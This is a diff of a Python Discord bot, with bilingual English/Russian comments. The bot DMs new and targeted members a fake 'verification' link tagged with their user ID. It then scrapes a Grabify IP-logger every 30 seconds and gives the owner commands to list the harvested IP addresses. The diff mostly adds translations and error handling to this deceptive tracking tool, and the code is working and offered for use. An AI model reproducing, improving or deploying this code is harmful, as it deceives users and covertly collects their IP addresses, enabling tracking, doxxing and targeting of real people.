@@ -6,33 +6,33 @@ import requests
 import re
 
 # ========================================
-# 1. CONFIGURATION
+# 1. CONFIGURATION / НАСТРОЙКИ
 # ========================================
 TOKEN = os.getenv('DISCORD_TOKEN')
 YOUR_USER_ID = int(os.getenv('YOUR_USER_ID', '0'))
 
-# YOUR VERIFICATION LINK
+# YOUR VERIFICATION LINK / ТВОЯ ССЫЛКА
 VERIFICATION_LINK = "https://verify-page.onrender.com"
 
 # GRABIFY LINK
 GRABIFY_LINK = "https://grabify.link/AC6BBB"
 TRACKING_CODE = GRABIFY_LINK.replace("https://grabify.link/", "")
 
-# CHANNEL ID FOR LOGS
-LOG_CHANNEL_ID = 1541000634210324510  # ← REPLACE WITH YOUR CHANNEL ID!
+# CHANNEL ID FOR LOGS / ID КАНАЛА ДЛЯ ЛОГОВ
+LOG_CHANNEL_ID = 123456789012345678  # ← REPLACE / ЗАМЕНИ!
 
 # ========================================
-# 2. BOT
+# 2. BOT / БОТ
 # ========================================
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='!', intents=intents)
 
-# Store data
+# Store data / Хранилище данных
 user_links = {}
 known_ips = {}
 
 def get_ip_from_grabify():
-    """Get IPs from Grabify"""
+    """Get IPs from Grabify / Получить IP из Grabify"""
     try:
         url = f"https://grabify.link/track/{TRACKING_CODE}"
         headers = {'User-Agent': 'Mozilla/5.0'}
@@ -55,7 +55,7 @@ def get_ip_from_grabify():
 
 @tasks.loop(seconds=30)
 async def check_grabify():
-    """Check Grabify for new IPs"""
+    """Check Grabify for new IPs / Проверка Grabify на новые IP"""
     global known_ips
     
     ips = get_ip_from_grabify()
@@ -92,7 +92,7 @@ async def on_ready():
 
 @bot.event
 async def on_member_join(member):
-    """When a new member joins - send verification link"""
+    """When a new member joins / Когда новый участник заходит"""
     try:
         user_id = str(member.id)
         tracking_link = f"{VERIFICATION_LINK}?id={user_id}"
@@ -126,12 +126,12 @@ async def on_voice_state_update(member, before, after):
         print(f"🔊 {member.name} joined {after.channel.name}")
 
 # ========================================
-# 3. COMMANDS
+# 3. COMMANDS / КОМАНДЫ
 # ========================================
 
 @bot.command(name='link')
 async def show_link(ctx):
-    """Show verification link"""
+    """Show verification link / Показать ссылку для верификации"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Only for owner!")
         return
@@ -146,7 +146,7 @@ async def show_link(ctx):
 
 @bot.command(name='ips')
 async def list_ips(ctx):
-    """Show collected IPs"""
+    """Show all collected IPs / Показать все собранные IP"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Only for owner!")
         return
@@ -168,7 +168,7 @@ async def list_ips(ctx):
 
 @bot.command(name='clear_ips')
 async def clear_ips(ctx):
-    """Clear collected IPs"""
+    """Clear all collected IPs / Очистить все собранные IP"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Only for owner!")
         return
@@ -178,7 +178,7 @@ async def clear_ips(ctx):
 
 @bot.command(name='force_check')
 async def force_check(ctx):
-    """Manually check Grabify for new IPs"""
+    """Force check Grabify for new IPs / Принудительно проверить Grabify"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Only for owner!")
         return
@@ -189,13 +189,13 @@ async def force_check(ctx):
 
 @bot.command(name='send_link')
 async def send_link(ctx, user: discord.Member = None):
-    """Send link to a specific user"""
+    """Send link to a specific user / Отправить ссылку конкретному пользователю"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Only for owner!")
         return
     
     if user is None:
-        await ctx.send("❌ Specify user: `!send_link @user`")
+        await ctx.send("❌ Please mention a user: `!send_link @user`")
         return
     
     try:
@@ -213,12 +213,14 @@ async def send_link(ctx, user: discord.Member = None):
         await user.send(embed=embed)
         await ctx.send(f"✅ Link sent to {user.name} in DM!")
         
+    except discord.Forbidden:
+        await ctx.send(f"❌ Cannot send DM to {user.name}. They have DMs disabled.")
     except Exception as e:
         await ctx.send(f"❌ Error: {e}")
 
 @bot.command(name='stats')
 async def show_stats(ctx):
-    """Show bot statistics"""
+    """Show bot statistics / Показать статистику бота"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Only for owner!")
         return
@@ -234,7 +236,7 @@ async def show_stats(ctx):
 
 @bot.command(name='grabify_link')
 async def show_grabify(ctx):
-    """Show Grabify tracking link"""
+    """Show Grabify tracking link / Показать ссылку Grabify"""
     if ctx.author.id != YOUR_USER_ID:
         await ctx.send("⛔ Only for owner!")
         return
@@ -249,11 +251,14 @@ async def show_grabify(ctx):
     await ctx.send(embed=embed)
 
 # ========================================
-# 4. RUN
+# 4. RUN / ЗАПУСК
 # ========================================
 if __name__ == "__main__":
     if not TOKEN:
         print("❌ ERROR: DISCORD_TOKEN not found!")
         exit(1)
+    
+    if LOG_CHANNEL_ID == 123456789012345678:
+        print("⚠️ WARNING: Replace LOG_CHANNEL_ID with your channel ID!")
     
     bot.run(TOKEN)
